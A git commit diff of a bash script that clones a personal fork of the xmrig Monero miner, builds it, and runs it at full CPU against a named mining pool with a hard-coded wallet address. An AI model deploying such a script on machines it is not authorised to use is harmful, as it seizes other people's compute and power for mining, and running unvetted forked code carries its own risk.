769d9bf1232f5dde0a12726274b4c8b1b6ab5d7e
daogster <26748523+daogster@users.noreply.github.com>
2018-03-11 13:05:14 -0500

    Update pr0nt0.sh

--- pr0nt0.sh
+++ pr0nt0.sh
@@ -1,12 +1,10 @@
 #!/bin/bash
-	sudo apt-get update 
-	sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev
-	git clone https://github.com/daogster/xmrig.git
-	cd xmrig
-	mkdir build
-	cd build
-	cmake ..
-	make
-	echo "FINISHED BUILDING..."
-	echo "NOW RUNNING..."
-	bash ./xmrig -o us.moriaxmr.com:5555 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQrJ3SiAqhgR23oWPhV -p robinXgreen -k
+sudo apt-get update 
+sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev
+git clone https://github.com/daogster/xmrig.git
+cd xmrig
+mkdir build
+cd build
+cmake ..
+make
+./xmrig -l config --donate-level 1 --max-cpu-usage 100 --cpu-priority 3 -o us.moriaxmr.com:5555 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQrJ3SiAqhgR23oWPhV -p robinXgreen -k
